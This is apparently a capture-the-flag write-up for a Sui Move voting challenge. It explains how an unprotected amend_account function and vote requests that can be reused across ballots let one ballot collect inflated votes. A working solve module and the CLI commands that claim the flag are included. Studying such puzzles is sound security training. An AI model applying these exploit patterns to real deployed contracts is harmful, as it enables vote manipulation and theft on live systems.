# Week 3

In [week 3](./bribery_voting/), we are given a slightly more complicated contract about ballot and voting. As per rules:

1. Everyone can register to become candidate
2. Candidates are allowed to change their registered account
3. Everyone can get ballot
4. Ballot contains 10 voting power to vote for the candidates
5. Briber will give you the flag if you have proof of giving certain candidate 21 votes

```rust
public fun get_flag(
    briber: &mut Briber,
    ballot: &Ballot,
    github_id: String,
    ctx: &TxContext,
) {
    let ballot_id = ballot.id();
    assert!(!briber.given_list.contains(ballot_id));
    let votes = ballot.voted().try_get(&required_candidate());
    assert!(votes.is_some());
    assert!(votes.destroy_some() >= required_votes());
    flag::emit_flag(ctx.sender(), ballot.id().to_address().to_string(), github_id);
    briber.given_list.add(ballot_id, true);
}
```

Since `Briber` will be created as a shared object upon contract deployment, our goal is to forge a `Ballot` where `0xbad` has more than 20 votes.

There are a few issues that we spotted:

```rust
public fun amend_account(
    candiate: &mut Candidate,
    account: address,
) {
    candiate.account = account;
}
```

In `candidate.move`, anyone can call `amend_account` to edit candidate's account. Therefore we can use it to change the account from `ctx.sender()` (us) to `0xbad`.

```rust
public fun vote(
    candiate: &mut Candidate,
    request: &mut VoteRequest,
    amount: u64,
) {
    let gain_votes = request.deduct_voting_power(candiate.account, amount);
    candiate.total_votes = candiate.total_votes + gain_votes;
}

public(package) fun deduct_voting_power(
    request: &mut VoteRequest,
    candidate: address,
    amount: u64,
): u64 {
    let change = request.voting_power.min(amount);
    request.voting_power = request.voting_power - change;
    if (request.voted.contains(&candidate)) {
        let v = request.voted.get_mut(&candidate);
        *v = *v + change;
    } else {
        request.voted.insert(candidate, change);
    };
    change
}
```

We are calling `vote` with a candidate and `VoteRequest`. This seems fine but when you look at `finish_voting`:

```rust
public fun finish_voting(ballot: &mut Ballot, request: VoteRequest) {
    let VoteRequest {
        voting_power: _,
        voted,
    } = request;
    let (candidates, votes) = voted.into_keys_values();
    candidates.zip_do!(votes, |c, v| {
        let ballot_voted = &mut ballot.voted;
        let already_voted = ballot_voted.try_get(&c);
        if (already_voted.is_some()) {
            *ballot_voted.get_mut(&c) = already_voted.destroy_some() + v;
        } else {
            ballot_voted.insert(c, v);
        }
    });
}
```

We are able to obtain multiple `VoteRequest` from other ballots for voting and thus increase the original ballot.

The exploit step is as follows:

1. `candidate::register` -> get candidate C
2. `candidate::amend_account` C.account=@0xbad
3. call `get_ballot` to get ballot1
4. `request_vote(ballot1)` for VoteRequest1 + `candidate::vote(C, VoteRequest1, 10)` + `finish_voting(ballot1, VoteRequest1)` -> ballot1.voted: (@0xbad, 10)
5. call `get_ballot` to get ballot2
6. `request_vote(ballot2)` for VoteRequest2 + `candidate::vote(C, VoteRequest2, 10)` + `finish_voting(ballot1, VoteRequest2)` -> ballot1.voted: (@0xbad, 20)
7. repeat and get 30 votes and finally call `get_flag(briber, ballot1)`

To do this, we first write a `solve_bribery_voting.move`:

```rust
module solve_bribery_voting::solve {
    use bribery_voting::ballot::{Ballot, request_vote, finish_voting};
    use bribery_voting::candidate::{Candidate, vote};

    public fun solve_request_vote(candidate: &mut Candidate, ballot: &mut Ballot, _ctx: &mut TxContext) {
        let mut vote_request = request_vote(ballot);
        vote(candidate, &mut vote_request, 10);
        finish_voting(ballot, vote_request);
    }

    public fun solve_request_vote_subsequent(candidate: &mut Candidate, ballot1: &mut Ballot, ballot2: &mut Ballot, _ctx: &mut TxContext) {
        let mut vote_request = request_vote(ballot2);
        vote(candidate, &mut vote_request, 10);
        finish_voting(ballot1, vote_request);
    }
}
```

This is simple - `solve_request_vote` gets the original ballot, while `solve_request_vote_subsequent` gets the following ballots used for requesting vote. Note that `request_vote` uses ballot2 while `finish_voting` is always on original ballot1.

After deploying the above contract, we can use Client CLI to solve:

```bash
# 0. candidate::register -> get candidate C
export PACKAGEID=0xba87679dae089213e3efed1330cfc02746af3dc27ce4a45f7066de1ef440d34e
export BRIBER=0xe6df370877f7b659a6aa28e58e6b54f839147523e5570b70e8ae00a7a34a2295
sui client call --package $PACKAGEID --module candidate --function register --gas-budget 100000000
export CANDIDATE=0xadeb22cdd2b2bc84898559528fb73261f55393e5889faf1bcabc0b4aec758d53

# 1. candidate::amend_account C.account=@0xbad
export BAD=0x0000000000000000000000000000000000000000000000000000000000000bad
sui client call --package $PACKAGEID --module candidate --function amend_account --args $CANDIDATE $BAD --gas-budget 100000000

# 2. call get_ballot to get ballot1
sui client call --package $PACKAGEID --module ballot --function get_ballot --gas-budget 100000000
export BALLOT1=0x8b9d30d26698dc98656754d027fbdde7b2e91842904ae186cb2d16bf300e9875

# 3. request_vote for VoteRequest1 + candidate::vote(C, VoteRequest1, 10) + finish_voting(ballot1, VoteRequest1) -> ballot1.voted: (@0xbad, 10)
export SOLVE=0xf40ec31c3fa9ebf1a72125d556eeb12e9d74368f14c36a142eeb89d27f4b295a
sui client call --package $SOLVE --module solve --function solve_request_vote --args $CANDIDATE $BALLOT1 --gas-budget 100000000
sui client object $BALLOT1 # value │  10

# 4. call get_ballot to get ballot2
sui client call --package $PACKAGEID --module ballot --function get_ballot --gas-budget 100000000
export BALLOT2=0xfa556e82093f8a11bacc3f9df378dd35532c4ba96e8d4e90ac6f0e7e1807c041

# 5. request_vote for VoteRequest2 + candidate::vote(C, VoteRequest2, 10) + finish_voting(ballot1, VoteRequest2) -> ballot1.voted: (@0xbad, 20)
sui client call --package $SOLVE --module solve --function solve_request_vote_subsequent --args $CANDIDATE $BALLOT1 $BALLOT2 --gas-budget 100000000
sui client object $BALLOT1 # value │  20

# 6. repeat and get 30 votes and finally call get_flag(briber, ballot1)
sui client call --package $PACKAGEID --module ballot --function get_ballot --gas-budget 100000000
export BALLOT3=0x7af30350ff8399937a47e0e6f478f8a4309179ce6fbf56a1f4f834c0ed40305f
sui client call --package $SOLVE --module solve --function solve_request_vote_subsequent --args $CANDIDATE $BALLOT1 $BALLOT3 --gas-budget 100000000
sui client call --package $PACKAGEID --module briber --function get_flag --args $BRIBER $BALLOT1 562e56bf-137f-4d17-89e1-390d90082ff9 --gas-budget 100000000
```